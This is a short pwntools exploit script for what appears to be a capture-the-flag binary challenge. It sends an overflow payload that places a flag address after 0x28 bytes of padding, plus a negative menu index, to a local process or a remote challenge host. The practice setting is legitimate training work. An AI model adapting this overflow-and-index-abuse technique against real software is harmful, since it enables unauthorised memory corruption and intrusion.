#!/usr/bin/env python3

from pwn import *
import struct

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe
flag = 0x4074A0

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # gdb.attach(r, api = True, gdbscript="""b*0x403400
        #                                         b*0x403018""")
    else:
        r = remote("chall.blackpinker.com", 32790)

    return r


def main():
    r = conn()
    # tel rbx-0x100 0x1000
    # good luck pwning :)
    name = b'A'*0x28 + p64(flag) + p64(0x38)*2
    r.sendlineafter(b"> ", name)
    r.sendlineafter(b"choice: ", b'-4')
    r.interactive()


if __name__ == "__main__":
    main()
